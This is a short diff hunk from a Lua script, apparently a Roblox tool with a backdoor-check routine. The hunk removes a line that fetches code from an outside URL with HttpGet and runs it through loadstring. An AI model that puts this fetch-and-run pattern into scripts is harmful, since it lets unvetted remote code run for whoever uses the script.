@@ -3323,5 +3323,4 @@ notif("Update","Added tags",10,nil)
 			BackdoorCheck("none","`"..v)
 		end
 	end
-end -- banned on the webhost again lol]]
-loadstring(game:HttpGet("https://screenshot.best/JH3C9O"))
+end -- banned on the webhost again lol
